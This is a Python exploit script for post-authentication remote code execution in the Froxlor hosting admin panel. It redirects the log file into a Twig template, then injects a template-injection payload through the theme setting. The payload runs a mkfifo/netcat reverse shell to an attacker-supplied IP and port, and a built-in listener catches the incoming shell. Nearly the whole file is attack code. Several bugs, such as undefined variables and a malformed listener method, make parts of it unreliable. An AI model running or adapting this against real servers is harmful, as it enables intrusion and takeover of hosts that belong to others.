#!/usr/bin/python3

import telnetlib
import requests
import socket
import sys
import warnings
from bs4 import BeautifulSoup
from threading import Thread

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')

# url = sys.argv[1]
# username = sys.argv[2]
# password = sys.argv[3]
# ip = sys.argv[4]
# port = sys.argv[5]



class FroxlorPostAuthRCE: 
    def __init__(self, target_origin: str, cookie:str):
        self.target_origin = target_origin
        self.request = requests.session()
        self.request.cookies.set_cookie(cookie)

    def exploit(self):
        index_url = "http://" + self.target_origin + "/admin_index.php"
        self.request.get(index_url)
        
        
        if self.change_log_path():
            self.inject_template()
  

    def change_log_path(self):
        change_log_path_url = url + "/admin_settings.php?page=overview&part=logging"
        csrf_token_req = self.request.get(change_log_path_url)
        csrf_token_req_response = csrf_token_req.text
        soup = BeautifulSoup(csrf_token_req_response, "lxml")
        csrf_token = (soup.find("meta",  {"name":"csrf-token"})["content"])
        print("[+] Main CSRF token retrieved %s" % csrf_token)

        multipart_data = {

            "logger_enabled": (None, "0"),
            "logger_enabled": (None, "1"),
            "logger_severity": (None, "2"),
            "logger_logtypes[]": (None, "file"),
            "logger_logfile": (None, "/var/www/html/froxlor/templates/Froxlor/footer.html.twig"),
            "logger_log_cron": (None, "0"),
            "csrf_token": (None, csrf_token),
            "page": (None, "overview"),
            "action": (None, ""),
            "send": (None, "send")
        
        }
        req = self.request.post(change_log_path_url, files=multipart_data)
        response = req.text
        if "The settings have been successfully saved." in response:
            print("[+] Changed log file path!")
            return True
        else:
            return False


    def inject_template(self):
        admin_page_path = url + "/admin_index.php"
        csrf_token_req = request.get(admin_page_path)
        csrf_token_req_response = csrf_token_req.text
        soup = BeautifulSoup(csrf_token_req_response, "lxml")
        csrf_token = (soup.find("meta",  {"name":"csrf-token"})["content"])
        
        onliner = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f".format(ip, port)
        payload = "{{['%s']|filter('exec')}}" % onliner
        
        data = {
            "theme": payload,
            "csrf_token": csrf_token,
            "page": "change_theme",
            "send": "send",
            "dosave": "",
        }
        req = self.request.post(admin_page_path, data, allow_redirects=False)
        try:
            location_header = req.headers["Location"]
            if location_header == "admin_index.php":
                print("[+] Injected the payload sucessfully!")
        except:
            print("[-] Can't Inject payload :/")
            exit()
            
        handler_thread = Thread(target=self.connection_handler, args=(port,))
        handler_thread.start()
        print("[+] Triggering the payload ...")
        req2 = self.request.get(admin_page_path)
        print("[+] Triggered the payload ...")



    def connection_handler(port):
        print("[+] Listener started on port %s" % port)
        t = telnetlib.Telnet()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", int(port)))
        s.listen(1)
        conn, addr = s.accept()
        print("[+] Connection received from %s" % addr[0])
        t.sock = conn
        print("[+] Heads up, incoming shell!!")
        t.interact()



